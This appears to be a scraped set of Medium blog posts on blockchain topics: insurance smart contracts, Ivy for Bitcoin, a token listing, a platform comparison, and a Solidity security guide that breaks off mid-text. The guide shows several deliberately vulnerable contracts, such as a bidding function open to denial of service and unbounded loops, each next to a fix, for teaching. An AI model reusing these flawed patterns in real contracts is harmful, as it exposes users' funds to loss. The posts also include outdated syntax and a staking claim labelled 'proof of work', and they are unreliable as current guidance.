Hong Kong-based Global Risk Exchange (GRE) to develop a blockchain-based solution to let agriculture producers protect against extreme-weather risks, among other solutions.Erica Li, digital business analyst at AXA Lab in Shanghai, says the partnership with GRE, if it is finalized, will focus on parametric insurance, where claim compensations are automatically triggered by a metric such as weather.GRE is building a new platform that uses distributed-ledger technology to connect insurance companies and policyholders, with a community of actuaries at the heart of the platform. Customers submit a risk they want to cover onto the platform, and actuaries will design a product for it, which will be put up to bid for insurance companies to service.Both premiums and claims will be exchanged over the ledger, with smart contracts governing whether policies need to be paid. In the extreme-weather example, data fed into the system from public sources such as rainfall volumes can trigger a farmer\u2019s claim automatically.From insurer to reinsurerIn addition to participating as a primary insurer on the GRE platform, AXA would like to also reinsure third-party insurance companies that it hopes will also participate.Frank Desvignes, Shanghai-based founder of AXA Lab Asia, says the project should help lower the costs of insurance. \u201cBlockchain platforms like GRE provide better protection to the underserved,\u201d he said.He adds that AXA will participate as both a primary insurer and a reinsurer on the platform, using the partnership to bolster its ambitions to grow in the reinsurance space.Paul Qi, Actuarial Representative of GRE, says the system works by requiring premiums remain on-chain, rather than going into insurers\u2019 pockets straightaway. Instead, premiums are locked in the smart contracts from which any claims can be immediately paid out.Therefore this business model caters to short-term, relatively small premium products in the property and casualty side of the industry. But it also opens such customer segments to insurers, which previously would not have been able to offer such products at an affordable rate. He hopes to launch the service by June with weather-based crop insurance for farmers in Southeast Asia.Advantages of\u00a0DLTUsing DLT also builds in more predictability to P&C business. Traditional underwriting capasity relies on credit reports and intangibles such as goodwill. \u201cHowever, it is still not guaranteed that insurers can pay claims,\u201d Qi said.But with blockchain technology, both premiums and payouts are locked into the system\u2019s logic of smart contracts. This means customers can be more confident that their claims will be quickly met.\u201cFor short-term products, there isn\u2019t enough time for insurance companies to see the return,\u201d Qi said. \u201cWhereas on our platform, insurers can predict their fixed returns assuming the risk event doesn\u2019t happen.\u201d Therefore the platform is suited for short-term P&C policies with easily defined parameter.Blockchain also lowers the cost of insurance products by connecting providers and end customers directly, without relying on agents in the middle, Qi says.How big is such a market? GRE\u2019s original idea was not only to target weather events for agriculture in Asian countries, it could apply to a wide variety of fields in livelihood, such as car insurance\u200a\u2014\u200awhich is the origin of Qi\u2019s career. Qi is also founder of Shanghai-based OK Chexian, an insurtech providing data-led motor insurance.Wan Peng, chief risk officer at Global Insurance Ecosystem Alliance (GIEA), a mainland China industry group, says last year China\u2019s car insurance generated Rmb75 billion ($9.87 billion) in premiums. Speaking at the Internet Insurance Summit in Shanghai last month, Wan says there are many customer segments in China that have yet to be explored.From DLT to\u00a0cryptoUsing DLT also moves insurance into the token economy, giving transactions a crypto-currency element. Qi says GRE has been testing more than 260 types of contracts trading with tokens, to make sure the blockchain can process deals at volume.\u201cTransaction velocity is always a concern when it comes to blockchain,\u201d Qi said. For now, GRE can process tens of thousands of tokens per second, but Qi says this isn\u2019t enough. \u201cThere may be a problem when our traffic increases,\u201d he said, if the platform has to handle tens of millions of token transactions at the same time. GRE continues to develop the technology to handle scalability, he says.GRE will issue their tokens named \u201cRisk Token\u201d in June, which customers can use to transact on the platform and convert in and out of fiat money.In the meantime, AXA intends to use the platform to introduce agricultural risk products based on smart contracts, Erica Li says the company is assessing which markets to target.The GRE group is working with consultants from crypto-currency (Coinbase, Caike Wallet), insurtech (JustInCase) and traditional insurance (Cruz Suiza Compania De Seguros and AXA).Source: DigFin Group https://www.digfingroup.com/gre/?from=singlemessage&isappinstalled=0Contains reasonable modification for better understanding.", "responses": ""}, {"title": "Ivy for Bitcoin: a smart contract language that compiles to Bitcoin\u00a0Script", "author_name": "Chain", "link": "https://blog.chain.com/ivy-for-bitcoin-a-smart-contract-language-that-compiles-to-bitcoin-script-bec06377141a?source=search_post---------9", "post_date": "Dec 18, 2017", "readtime": "3 min read", "upvotes": "2.7K", "content": "Ivy for Bitcoin: a smart contract language that compiles to Bitcoin\u00a0ScriptChainBlockedUnblockFollowFollowingDec 18, 2017Peter Todd\u2019s SHA1 collision bounty, written in\u00a0IvyToday, we\u2019re delighted to release an open-source compiler and developer environment for writing Bitcoin smart contracts using Ivy, a smart contract language developed at Chain. Ivy helps you write custom, SegWit-compatible Bitcoin addresses that enforce arbitrary combinations of conditions supported by the Bitcoin protocol, including signature checks, hash commitments, and timelocks.Ivy is designed to make it easy to manipulate value the way other programming languages let you manipulate data. You can try out Ivy using the Ivy Playground for Bitcoin, and read more about it in the docs. (Please note that Ivy is relatively untested prototype software and should be used for educational and research purposes only.)How Bitcoin smart contracts workIf you\u2019re interested in blockchain networks, you\u2019ve probably heard of \u201csmart contracts\u201d\u200a\u2014\u200aprograms that can control on-chain resources using custom logic executed as part of blockchain validation. This concept is usually associated with Ethereum, which supports stateful, Turing-complete smart contracts. But did you know that you can also write smart contracts for the Bitcoin network?Bitcoin allows you to write such contracts using a low-level programming language, Bitcoin Script. Every Bitcoin address corresponds to a Bitcoin Script program.When you send bitcoins to an address, you are essentially locking them in a safety deposit box on the blockchain. These boxes are typically referred to as \u201cunspent transaction outputs,\u201d but we\u2019ll refer to them as \u201ccontracts.\u201d Each contract has an address, which corresponds to a program that must be satisfied in order to unlock and spend the bitcoins.Bitcoin Script is the low-level \u201cassembly language\u201d used to write custom addresses in the Bitcoin protocol. Programs in Bitcoin Script look like this:A Bitcoin Script program from BIP 112, by BtcDrak, Mark Friedenbach, and Eric\u00a0LombrozoBitcoin\u2019s \u201cvirtual machine\u201d\u200a\u2014\u200athe piece of the protocol responsible for executing Bitcoin Script programs\u200a\u2014\u200ais far more limited than the virtual machines used in other smart contract platforms, such as Ethereum or the Chain Protocol, and its instruction set is not even Turing-complete. But Bitcoin Script does provide a set of useful primitives\u200a\u2014\u200asignature checks, hash computations, and absolute and relative timelocks\u200a\u2014\u200aand the freedom to combine those primitives.Right now, Bitcoin Script is used by relatively few people. Bitcoin wallets, exchanges, and payment platforms sometimes use Bitcoin Script to create security solutions, like multisignature wallets. Protocol developers have used Bitcoin Script to design interesting solutions for scaling, privacy, and interoperability, such as Interledger and the Lightning Network. But Bitcoin Script development is considered somewhat esoteric.One reason for this is the limitations of the underlying virtual machine, but another is the relative difficulty of reading and writing Bitcoin Script programs, and of creating and using addresses from those programs.Introducing IvyIvy is a higher-level language that supports compilation to Bitcoin Script. Ivy programs look like this (explained here):The same Bitcoin Script program as above, written as a contract template in\u00a0IvyIvy is a language for writing contract templates. Each contract template, when instantiated with specific parameters, can compile to a Bitcoin address (specifically, a Segregated Witness-compatible address).To try out Ivy, you can use the Ivy Playground for Bitcoin, which allows you to design, create, and spend simulated Bitcoin contracts. The playground includes preloaded templates demonstrating a small fraction of possible contracts. The docs explain those examples and describe how you can use the playground to write and test your own contracts.We hope that Ivy makes it easier to learn about Bitcoin, smart contracts, and programmable value. We can\u2019t wait to see what you do with it.AcknowledgementsWe\u2019d like to thank Boyma Fahnbulleh, Andrew Miller, Emin G\u00fcn Sirer, Patrick McCorry, Jeremy Rubin, Steven McKie, Olaoluwa Osuntokun, Kathleen Breitman, and Nick Szabo for their feedback on Ivy. Special thanks to Christopher Jeffrey and the other developers of bcoin.", "responses": "9"}, {"title": "Quadrant Assets Smart Contract, Project and Token\u00a0Details", "author_name": "Quadrant Assets", "link": "https://medium.com/@quadrantassets/quadrant-assets-smart-contract-project-and-token-details-8e25969c7e71?source=search_post", "post_date": "Jun 4, 2018", "readtime": "", "upvotes": "2.9K", "content": "Quadrant Assets Smart Contract, Project and Token\u00a0DetailsQuadrant AssetsBlockedUnblockFollowFollowingJun 4, 2018Smart Contract Address: 0x3da6c7db68f17e72ce153e485e453922f46b1d4aToken name: Quadrant AssetsToken ticker symbol: QDAToken type: Ethereum ERC20 Total token supply: 1.250.000.000 billionsWebsite: quadrantassets.solutionsOfficial Contact Email Address: info@quadrantassets.solutionsReddit: quadrantassetsFacebook: quadrantassets.solutionsTwitter: @quadrantassetsGithub: quadrantassetsTelegram: quadrantassets", "responses": "2"}, {"title": "Comparison of Smart Contract Platforms", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/comparison-of-smart-contract-platforms-2796e34673b7?source=search_post", "post_date": "Mar 5, 2018", "readtime": "10 min read", "upvotes": "2.8K", "content": "Comparison of Smart Contract PlatformsMichiel MuldersBlockedUnblockFollowFollowingMar 5, 2018Ivy-lang, Plutus, Solidity, Scrypto, Michelson, Hoon, Rust,\u00a0\u2026You serious??When should I find the time to explore all these languages? Most of them are barely used, making it incredibly hard to adopt them. Solidity is leading the pack, although, it\u2019s not an easy language to get started with. This article will criticize and give new insights in the following platforms: Ethereum, Hyperledger Fabric, NEM, Stellar, iOlite, Neblio, and Lisk.Source: www.tenor.comTo give you an overview of all different existing smart contract platforms:Source: www.github.comFinding The Right Smart Contract\u00a0PlatformI will feature some existing smart contract platforms and some upcoming ones. I\u2019ve selected these based on maturity, flexibility and the innovation they add to our ecosystem.Ethereum\u200a\u2014\u200aOld but\u00a0GoldEthereum is always a safe bet. Ethereum is a gold standard in the world of smart contracts and has the biggest capitalization among other platforms. The majority of token sales happen on the Ethereum platform, using the ERC-20 token standard.However, this standard has some serious bugs which have already led to major losses in the industry. Let me explain this.ERC-20 assumes two ways of performing a token transaction:1. transfer(): Send tokens to someone\u2019s address.2. approve() + transferFrom(): Deposit tokens to a smart contract.But what if you use transfer() to send tokens to a smart contract by accident? The transaction will succeed but this transaction will not be recognized by the recipient contract.\u201cFor example, if you send tokens to a decentralized exchange contract, then the exchange contract will receive your tokens but it will not credit these tokens to your exchange token balance. Moreover, if the decentralized exchange contract does not implement an emergency token extraction function, then it\u2019s impossible to get your tokens back in any case, resulting in a permanent loss of the tokens. Due to this bug, the Ethereum ecosystem has lost millions of dollars already.\u201dMy all-time favorite GIF\u200a\u2014\u200aSource.This information is provided by Reddit user u/Dexaran (source article), creator of the ERC223 standard. Dexaran is the first developer who has notified the Ethereum community about the aforementioned bug. In response to this, he has created the ERC223 standard.Most developers are not aware of this ERC223 and ERC77 standard. To give a short comparison of both standards:ERC223: This improved standard resolves the ERC20 critical bug by making the transfer() function throw an error on invalid transfers and canceling the transaction so no funds are lost. \u2192 Focussed on security.ERC777: Solves ERC20\u2019s problems, such as lack of transaction handling mechanisms. \u2192 Focussed on mainstream adoption.As you can see, the community still has to grow in terms of adopting more secure/better token standards.NEMScalability is the most critical thing about NEM\u2019s decentralized application. While ETH does a maximum of 15 transactions per second, NEM reportedly manages hundreds of transactions per second. The NEM foundation has given security and availability a priority so entrepreneurs deal with other problems and not technical difficulties.While NEM is reportedly the faster, safer and easier technology, Ethereum provides a broader base for the creation of custom DApps. The main difference is that ETH applies its Smart Contracts on the Blockchain, while NEM uses code off the blockchain. Although this might arguably make it less decentralized, the method does have its benefits, such as better security, easier updates, faster execution times and lighter code.Reddit user Nemario told me that the contract code can be updated at any time, all without any interaction with the chain. It is not possible to execute reverse transactions. This makes NEM less decentralized in one way, but on-chain security features like multi-sig and smart assets mitigate this \u2018problem\u2019.NEM has customized data management apps called smart assets through which you can create tokens, data records, voting systems and other coins with just a few clicks. Where Ethereum is targeting companies intend to rebuild internal networks in the next 5 to 10 years, NEM is targeting companies looking for a fast, secure, and ready to use and handle solution that\u2019s current. It will be interesting to see which companies adopt NEM over Ethereum. Source: www.cashtechnews.comNEM provides several SDKs, below you can find a NodeJS snippet of a transfer transaction.Hyperledger FabricHyperledger Fabric (HLF) likes to call its smart contracts \u2018chaincode\u2019. HLF is an enterprise permissioned blockchain, built with great flexibility, which makes it very useful for businesses as their business rules change after approximately 7 years. Most other blockchains are not built considering flexibility.Hyperledger Fabric itself was written on Go language, so its smart contracts support this language as well. Benefits? Golang is a very efficient language with a fast compile time.In my opinion, writing chaincode is simple. The three most important functions are:PutState: Create new asset or update existing one.GetState: Retrieve asset.GetHistoryForKey\u00a0: Retrieve history of changes.DelState: \u2018Delete\u2019 asset.Note on DelState: HLF uses a state database that stores keys and their values. This is different from the sequence of blocks that make up the blockchain. A key and its associated value can be removed from the state database using the DelState function. However, this does not mean that there is an alteration of blocks on the blockchain.The removal of a key and value would be stored as a transaction on the blockchain just as the prior addition and any modifications were stored as transactions on the blockchain.The history of a key can be retrieved after the key is deleted. There is a GetHistoryForKey() function that retrieves the history and part of its response is an IsDeleted flag that indicates if the key was deleted. It would be possible to create a key, delete the key, and then create the key again; the GetHistoryForKey() function would track such a case.Example chaincode:Stellar Smart ContractsStellar smart contracts (SSC) are much different from Ethereum smart contracts. They are not Turing complete and are implemented as an agreement between multiple parties and enforced by transactions. Below you see a comparison between Stellar and Ethereum. Notice the huge difference in cost and confirmation time. A single transaction on the Stellar network costs only ~$0.0000002!Source: https://www.stellar.org/blog/using-stellar-for-ico/SSCs can be written in any language the Stellar community provides an API for (JavaScript, Python, Golang, PHP,\u00a0\u2026). You can find an example of a smart contract in PHP here.An SSC is expressed as compositions of transactions that are connected and executed using various constraints. The following are examples of constraints that can be considered and implemented when creating SSCs (from Stellar documentation):Multisignature\u200a\u2014\u200aWhat keys are needed to authorize a certain operation? What parties need to agree on a circumstance in order to execute the steps?Multisignature is the concept requiring signatures of multiple parties to sign transactions stemming from an account. Through signature weights and thresholds, representation of power in signatures is created.Batching/Atomicity\u200a\u2014\u200aWhat operations must all occur together or fail? What must happen in order to force this to fail or pass?Batching is the concept of including multiple operations in one transaction. Atomicity is the guarantee that given a series of operations, upon submission to the network if one operation fails, all operations in the transaction fails.Sequence\u200a\u2014\u200aIn what order should a series of transactions be processed? What are the limitations and dependencies?The concept of sequence is represented on the Stellar Network through sequence number. Utilizing sequence numbers in transaction manipulation, it can be guaranteed that specific transactions do not succeed if an alternative transaction is submitted.Time Bounds\u200a\u2014\u200aWhen can a transaction be processed?Time bounds are limitations on the time period over which a transaction is valid. Using time bounds enables time periods to be represented in an SSC.Platforms Under ConstructionWe cannot forget about platforms which are developing promising smart contract products. Let\u2019s take a look at our future options.Source: www.mentalfloss.comiOlite\u200a\u2014\u200aCreate Smart Contracts With Natural\u00a0LanguageiOlite is a product which focuses on the mass adoption of smart contract technology by providing an easy to use engine which is capable of understanding natural language to be compiled to smart contract code. iOlite is the ideal solution if you don\u2019t want to spend time learning, instead just start creating smart contracts.iOlite is based on the research done at Stanford University. They invented the FAE (Fast Adaptation Engine), which is capable of converting natural language or any other desired programming language into smart contract code. The FAE is not just straightaway translating your input to code. The FAE depends on contributors (smart contract experts) that are able to define structures containing language expressions. Furthermore, these structures are tied to smart contract code they write. This allows the engine to browse the structures to find the right expression so it can compile the desired smart contract. Whenever a structure is used, a contributor gets iOlite tokens rewarded.As you can see, iOlite relies on their community to make the FAE successful. The FAE helps them by applying Machine Learning techniques to help it learn and adopt new structures more easily.iOlite Labs is currently focusing on Ethereum smart contracts with Solidity as there is a massive need.Travis Byrne from the iOlite team explained which languages can be used to create smart contracts. \u201cWhat this means is that not only can programmers (in formal languages such as Python, C, JavaScript, etc.) immediately use their existing skills to write smart contracts, but also average people with no programming knowledge whatsoever, can just as easily start developing with natural languages like English. iOlite is dissolving the existing technical learning boundaries for creating smart contracts.\u201dSource: https://baseberry.com/smart-contract/Neblio\u200a\u2014\u200aBlockchain for\u00a0BusinessNeblio is targeting the integration of blockchain into pre-existing enterprises via easy to use APIs in eight of the most commonly used programming languages. The key goal of Neblio is to provide an easy to use blockchain for existing businesses. Developers should be able to use Neblio blockchain technology without being a blockchain expert.Neblio provides a Raspberry Pi wallet to stake your coins. The wallet itself can be set up with just one command after downloading the source code. By staking coins and running the node, you help to secure the wallet via a proof of work consensus algorithm and in return, you get a 10% increase on the amount of staked coins.Source: www.flickr.comThere is no obligation to run your Raspberry Pi day and night. Neblio allows you to have in total 7 days of downtime. Your coins will still gain weight during this time whilst your Raspberry Pi is off, however you won\u2019t be able to discover blocks (and therefore receive staking rewards). The wallet itself consumes very little energy which makes it a great incentive for holding your Neblio coins in order to have a more stable coin price. Source: Reddit.Probably you will ask yourself: How can your Raspberry Pi stay update to date as you can switch it off for so long? If you do this with an Ethereum node, you would have to sync for hours downloading the new data.Source: gifimage.netThis is why Neblio has come up with this cool featured called QuickSync which is capable of synchronizing your node in less than a minute. But how? A fresh copy of the Neblio blockchain is now uploaded every night at midnight to Github. The Raspberry Pi will by default download the blockchain data from Github on their first install or when you have switched off your node for a couple of days, extract it to your Neblio data directory, and then sync up the remaining few hours. This should result in near-instant syncing. Source: Reddit.What about Quick Sync security? The wallet will still verify all transactions. If there are any erroneous transactions, it won\u2019t sync up to the newest block. So, downloading the blockchain via Quick Sync is just as secure.Lisk\u200a\u2014\u200aSidechainsLisk is not in the smart contract business. Lisk intends to allow interfacing with smart contract systems, such as Ethereum, through virtual machine integration. Let me make this clear. Lisk is not a smart contract system, it is a custom blockchain system. Lisk has built their business model around creating a simplified user experience and platform to easily implement custom generated blockchains for anyone from the individual, to the small business, to large banks.Lisk runs every single application on a completely separate, isolated sidechain, responsible for itself. If a sidechain fails, the blame and responsibility falls squarely on the shoulders of the developer running the sidechain.Another great benefit of Lisk is its consensus algorithm. They use \u2018Delegate Proof of Stake\u2019, which is faster, more secure and consumes way less energy than Proof of Stake. You can learn more about it here.This final point is a contentious one and may be a matter of personal preference. Lisk is attempting to tap into the several hundred thousand strong JavaScript developer community by building their entire ecosystem in JavaScript. This makes it very easy for traditional web application developers to build out and interface with Lisk custom blockchains. There is zero need for them to learn a new language and JavaScript has been thoroughly tested and its issues well documented (JavaScript is far from perfect).Source: 3 ways Lisk isn\u2019t Ethereum and why it\u2019s a good thing\u200a\u2014\u200aMattewdcConclusionIt\u2019s hard to compare all platforms as it just depends on your needs. It\u2019s best to look at the maturity of each platform as that\u2019s a good indicator: SDK, build tools, proper documentation? iOlite is as well a good choice when you want to prototype smart contracts very fast. In my opinion, Stellar is a strong upcoming opponent in terms of low costs and a fast blockchain confirmation time.Featured ImageSource: https://cdn.gratisography.com/photos/435H.jpg", "responses": "22"}, {"title": "How Hard is it to become a Smart Contract Developer?", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/how-hard-is-it-to-become-a-smart-contract-developer-f159bafd8018?source=search_post", "post_date": "Sep 16, 2017", "readtime": "7 min read", "upvotes": "2.1K", "content": "How Hard is it to become a Smart Contract Developer?TL;DR\u200a\u2014\u200aIt is not that hard to become a half decent smart contract developer.Dave KajpustBlockedUnblockFollowFollowingSep 16, 2017There is an extreme amount of excitement around blockchain projects for investing, innovation, and development. The amount of capital flowing into the space, mostly through ICOs, has put blockchain and smart contract developers on a pedestal. If that much money is flowing towards it, it must be extremely hard to develop blockchain applications.I am here to tell you that this is not the case! I went from having no coding experience in March 2017, to becoming a smart contract developer and completing my first decentralized application (dApp) 6 months later.The amount of money and excitement in the space is driving up the demand for Smart Contract developers. Because of this they can demand very high salaries. It is easy to pay a developer a high salary when there is so much money flowing towards ICO\u2019s. This ICO raised $35 million dollars in a 30 seconds, and this year ICO fundraising has surpassed early stage VC funding.I am going to explain how smart contract development isn\u2019t that much harder than learning to code other languages, and that there are major benefits to committing yourself to learning how to develop on the blockchain.A few Caveats Before we\u00a0BeginI want to make a few distinctions though. I am talking about smart contract development only, with a focus on Ethereum and Solidity. I am not talking about building out entire blockchains from scratch. To build out a brand new blockchain like the developers of Bitcoin, Ethereum, Monero or Zcash did is wayyyyy more difficult that building a dApp on Ethereum. All of the code and the architecture built out for those are built out by expert programmers, cryptographers, and computer scientists.I also want to make a distinction between being a good smart contract developer and a beginner smart contract developer. I am not saying you can become a good smart contract developer from scratch in 7 months. But the skills are in such high demand that even a beginner smart contract developer can earn a very high salary.", "responses": "23"}, {"title": "Onward with Ethereum Smart Contract\u00a0Security", "author_name": "Manuel Araoz", "link": "https://blog.zeppelin.solutions/onward-with-ethereum-smart-contract-security-97a827e47702?source=search_post", "post_date": "Aug 16, 2016", "readtime": "12 min read", "upvotes": "1.7K", "content": "Onward with Ethereum Smart Contract\u00a0SecurityManuel AraozBlockedUnblockFollowFollowingAug 16, 2016If you\u2019re new to Ethereum development, I recommend you read our Hitchhiker\u2019s Guide to Smart Contracts in Ethereum before proceeding.Learning Ethereum Smart Contract security is a very hard endeavor. There are few good guides and compilations, such as Consensys\u2019 Smart Contracts Best Practices, or the Solidity Documentation Security Considerations. But the concepts are very hard to remember and internalize without writing your own code.I\u2019ll attempt a slightly different approach. I\u2019ll explain some recommended strategies to improve smart contract security and show code examples where not following them results in problems. I\u2019ll also show you code samples you can use to protect your smart contracts. Hopefully, this will help create a muscle memory of things to avoid, which will trigger mental warnings when writing actual code.Without further ado, let\u2019s dive into the best practices:Fail as early and loudly as\u00a0possibleA simple yet powerful programming good practice is to make your code fail as promptly as possible. And be loud about it. Let\u2019s see an example of a function that behaves timidly:// UNSAFE CODE, DO NOT USE!contract BadFailEarly {  uint constant DEFAULT_SALARY = 50000;  mapping(string => uint) nameToSalary;  function getSalary(string name) constant returns (uint) {    if (bytes(name).length != 0 && nameToSalary[name] != 0) {      return nameToSalary[name];    } else {      return DEFAULT_SALARY;    }  }}We want to avoid a contract failing silently, or continuing execution in an unstable or inconsistent state. The function getSalary is checking for conditions before returning the stored salary, which is a good thing. The problem is, in case those conditions are not met, a default value is returned. This could hide an error from the caller. This is an extreme case, but this kind of programming is very common, and normally arises from fear of errors breaking our app. Truth is, the sooner we fail, the easier it will be to find the problem. If we hide errors, they can propagate to other parts of the code and cause inconsistencies which are difficult to trace. A more correct approach would be:contract GoodFailEarly {  mapping(string => uint) nameToSalary;    function getSalary(string name) constant returns (uint) {    if (bytes(name).length == 0) throw;        if (nameToSalary[name] == 0) throw;        return nameToSalary[name];  }}This version also shows another desirable programming pattern which is separating preconditions and making each fail separately. Note that some of these checks (especially those depending on internal state) can be implemented via Function Modifiers.Favor pull over push\u00a0paymentsEvery Ether transfer implies potential code execution. The receiving address can implement a fallback function that can throw an error. Thus, we should never trust that a send call will execute without error. A solution: our contracts should favor pull over push for payments. Take a look at this innocent looking code for a bidding function:// UNSAFE CODE, DO NOT USE!contract BadPushPayments {  address highestBidder;  uint highestBid;   function bid() {    if (msg.value < highestBid) throw;    if (highestBidder != 0) {      // return bid to previous winner      if (!highestBidder.send(highestBid)) {        throw;      }    }    highestBidder = msg.sender;    highestBid = msg.value;  }}Note that the contract calls the send function and checks its return value, which seems reasonable. But it calls send in the middle of a function, which is unsafe. Why? Remember that, as stated above, send can trigger the execution of code in another contract.Imagine someone bids from an address which simply throws an error every time someone sends money to it. What happens when someone else tries to outbid that? The send call will always fail, bubbling up and making bid throw an exception. A function call that ends in error leaves the state unchanged (any changes made are rolled back). That means nobody else can bid, and the contract is broken.The easiest solution is to separate payments into a different function, and have users request (pull) funds independently of the rest of the contract logic:contract GoodPullPayments {  address highestBidder;  uint highestBid;  mapping(address => uint) refunds;    function bid() external {    if (msg.value < highestBid) throw;        if (highestBidder != 0) {      refunds[highestBidder] += highestBid;    }        highestBidder = msg.sender;    highestBid = msg.value;  }    function withdrawBid() external {    uint refund = refunds[msg.sender];    refunds[msg.sender] = 0;    if (!msg.sender.send(refund)) {      refunds[msg.sender] = refund;    }  }}This time, we use a mapping to store refund values for each outbid bidder, and provide a function to withdraw their funds. In case of a problem in the send call, only that bidder is affected. This is a simple pattern that solves many other problems (such as reentrancy), so remember: when sending ether, favor pull over push payments.I\u2019ve implemented a contract you can inherit from to easily use this pattern.Order your function code: conditions, actions, interactionsAs an extension of the fail-early principle, a good practice is to structure all your functions as follows: first, check all the pre-conditions; then, make changes to your contract\u2019s state; and finally, interact with other contracts.Conditions, actions, interactions. Sticking to this function structure will save you lots of problems. Let\u2019s see an example of a function using this pattern:function auctionEnd() {  // 1. Conditions  if (now <= auctionStart + biddingTime)    throw; // auction did not yet end  if (ended)    throw; // this function has already been called  // 2. Effects  ended = true;  AuctionEnded(highestBidder, highestBid);  // 3. Interaction  if (!beneficiary.send(highestBid))    throw;  }}This is in line with the fail fast principle, as conditions are checked in the beginning. It also leaves potentially dangerous interactions with other contracts to the very end.Be aware of platform\u00a0limitsThe EVM has a lot of hard limits on what our contracts can do. These are platform-level security considerations, but may threaten your particular contract\u2019s security if you don\u2019t know about them. Let\u2019s take a look at the following innocent-looking employee bonus management code:// UNSAFE CODE, DO NOT USE!contract BadArrayUse {    address[] employees;    function payBonus() {    for (var i = 0; i < employees.length; i++) {      address employee = employees[i];      uint bonus = calculateBonus(employee);      employee.send(bonus);    }       }    function calculateBonus(address employee) returns (uint) {    // some expensive computation ...  }}Read the code: it\u2019s pretty straight-forward and seems correct. It hides 3 potential problems, though, based on platform limits.The first problem is that the type of i will be uint8, because this is the smallest type that is required to hold the value 0. If the array has more than 255 elements, the loop will not terminate, resulting in gas depletion. Better use the explicit type uint for no surprises and higher limits. Avoid declaring variables using var if possible. Let\u2019s fix that:// STILL UNSAFE CODE, DO NOT USE!contract BadArrayUse {    address[] employees;    function payBonus() {    for (uint i = 0; i < employees.length; i++) {      address employee = employees[i];      uint bonus = calculateBonus(employee);      employee.send(bonus);    }       }    function calculateBonus(address employee) returns (uint) {    // some expensive computation ...  }}The second thing you should consider is the gas limit. Gas is Ethereum\u2019s mechanism to charge for network resources. Every function call that modifies state has a gas cost. Imagine calculateBonus calculates the bonus for each employee based on some complex computation like calculating the profit over many projects. This would spend a lot of gas, which could easily reach the transaction\u2019s or block\u2019s gas limit. If a transaction reaches the gas limit, all changes will be reverted but the fee is still paid. Be aware of variable gas costs when using loops. Let\u2019s optimize the contract by separating the bonus calculation from the for loop. Please note that this still has the issue that as the employees array grows, the gas cost grows.// UNSAFE CODE, DO NOT USE!contract BadArrayUse {    address[] employees;  mapping(address => uint) bonuses;      function payBonus() {    for (uint i = 0; i < employees.length; i++) {      address employee = employees[i];      uint bonus = bonuses[employee];      employee.send(bonus);    }       }    function calculateBonus(address employee) returns (uint) {    uint bonus = 0;    // some expensive computation modifying the bonus...    bonuses[employee] = bonus;  }}Last, there is the call stack depth limit. The EVM\u2019s call stack has a hard limit of 1024. That means that if the amount of nested calls reaches 1024, the contract will fail. An attacker can call a contract recursively 1023 times and then call our contract\u2019s function, causing sends to silently fail because of this limit. PullPayment.sol was described above, and allows to easily implement pull payments. Inheriting from PullPayment and using asyncSend protects you from this.Update: EIP150 fixed this problem, removing the possibility of a call stack attack by reducing the amount of gas each recursive call gets.Here\u2019s a modified version of the code that fixes all these issues:import './PullPayment.sol';contract GoodArrayUse is PullPayment {  address[] employees;  mapping(address => uint) bonuses;    function payBonus() {    for (uint i = 0; i < employees.length; i++) {      address employee = employees[i];      uint bonus = bonuses[employee];      asyncSend(employee, bonus);    }  }  function calculateBonus(address employee) returns (uint) {    uint bonus = 0;    // some expensive computation...    bonuses[employee] = bonus;  }}To sum up, be sure to remember about (1) limits in the types you\u2019re using, (2) limits in the gas costs of your contract, and (3) the call stack depth limit.Write testsWriting tests is a lot of work, but will save you from regression problems. A regression bug appears when a previously correct component gets broken based on a recent change.I\u2019ll be writing a more extensive guide on testing soon, but if you\u2019re curious you can check Truffle\u2019s testing guide.Fault tolerance and Automatic bug\u00a0bountiesThanks to Peter Borah for inspiration on these two ideas. Code reviews and security audits are not enough to be safe. Our code needs to be ready for the worst. In case there is a vulnerability in our smart contract, there should be a way for it to safely recover. Not only that, but we should try to find those vulnerabilities as early as possible. That\u2019s where automatic bug bounties built into our contract can help.Let\u2019s take a look at this simple implementation of an automatic bug bounty for a hypothetical Token contract:import './PullPayment.sol';import './Token.sol';contract Bounty is PullPayment {  bool public claimed;  mapping(address => address) public researchers;    function() {    if (claimed) throw;  }    function createTarget() returns(Token) {    Token target = new Token(0);    researchers[target] = msg.sender;    return target;  }    function claim(Token target) {    address researcher = researchers[target];    if (researcher == 0) throw;        // check Token contract invariants    if (target.totalSupply() == target.balance) {      throw;    }    asyncSend(researcher, this.balance);    claimed = true;  }}As before, we\u2019re using PullPayment to make our outgoing payments safe. This Bounty contract allows researchers to create copies of the Token contract we want audited. Anyone can contribute to the bug bounty by sending transactions to the Bounty contract\u2019s address. If any researcher manages to corrupt his copy of the Token contract, making some invariant break (for example, in this case, making the total supply of tokens different from the Token\u2019s balance), he\u2019ll get the bounty reward. Once the bounty is claimed, the contract won\u2019t accept any more funds (that nameless function is called the contract\u2019s fallback function, and is executed every time the contract is sent money directly).As you can see, this has the nice property that it is a separate contract and requires no modification of our original Token contract. Here\u2019s a full implementation available on GitHub for anyone to use.As for fault tolerance, we will need to modify our original contract to add extra safety mechanisms. A simple idea is to allow a contract\u2019s curator to freeze the contract as an emergency mechanism. Let\u2019s see a way to implement this behavior via inheritance:contract Stoppable {  address public curator;  bool public stopped;  modifier stopInEmergency { if (!stopped) _; }  modifier onlyInEmergency { if (stopped) _; }    function Stoppable(address _curator) {    if (_curator == 0) throw;    curator = _curator;  }    function emergencyStop() external {    if (msg.sender != curator) throw;    stopped = true;  }}Stoppable allows one to specify a curator address that can stop the contract. What does \u201cstopping the contract\u201d mean? That\u2019s to be defined by the child contract inheriting from Stoppable by using the function modifiers stopInEmergency and onlyInEmergency. Let\u2019s see an example:import './PullPayment.sol';import './Stoppable.sol';contract StoppableBid is Stoppable, PullPayment {  address public highestBidder;  uint public highestBid;    function StoppableBid(address _curator)    Stoppable(_curator)    PullPayment() {}    function bid() external stopInEmergency {    if (msg.value <= highestBid) throw;        if (highestBidder != 0) {      asyncSend(highestBidder, highestBid);    }    highestBidder = msg.sender;    highestBid = msg.value;  }    function withdraw() onlyInEmergency {    suicide(curator);  }}In this toy example, the bid can now be stopped by a curator, defined when the contract is created. While the StoppableBid is in normal mode, only the bid function can be called. If something weird happens and the contract is in an inconsistent state, the curator can step in and activate the emergency state. This makes the bid function uncallable, and allows the function withdraw to work.In this case, emergency mode would only allow the curator to destroy the contract and recover the funds, but in a real case, recovery logic could be more complex (for example returning funds to their owners). Here\u2019s an implementation of Stoppable available on GitHub for anyone to use.Limit the amount 